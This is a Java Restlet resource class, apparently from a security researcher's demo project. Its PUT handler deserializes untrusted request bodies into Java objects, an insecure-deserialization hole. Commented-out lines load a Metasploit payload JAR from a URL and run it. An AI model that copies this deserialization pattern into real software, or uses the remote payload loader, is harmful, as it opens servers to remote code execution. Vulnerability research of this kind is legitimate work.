package org.pwntester.restlet;

import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;

import org.restlet.data.Status;
import org.restlet.representation.ObjectRepresentation;
import org.restlet.representation.Representation;
import org.restlet.resource.Get;
import org.restlet.resource.Put;
import org.restlet.resource.ServerResource;
import org.restlet.data.MediaType;

public class ContactResource extends ServerResource {

	@Get
	public ObjectRepresentation<Contact> getContact() {
		ObjectRepresentation<Contact> contact = new ObjectRepresentation<Contact>(new Contact());
		contact.setMediaType(MediaType.APPLICATION_JAVA_OBJECT_XML);
		return contact;
	}

	@Put
	public void createContact (Representation entity) throws IOException {
		try {

			// URLClassLoader u = new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")});
			// Class c = u.loadClass("metasploit.Payload");
            // c.newInstance();
			// try {
			//    c.getMethod("main",new Class[]{Class.forName("[Ljava.lang.String;")}).invoke(null,new Object[]{new String[0]});
			// } catch (Exception e) {
			//    e.printStackTrace();
			// }

            ObjectRepresentation<Contact> repObject = new ObjectRepresentation<Contact>(entity);
			Contact contact = repObject.getObject();
			System.out.println("name : " + contact.getName());
			System.out.println("firstname : " + contact.getLastName());
			setStatus(Status.SUCCESS_OK);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
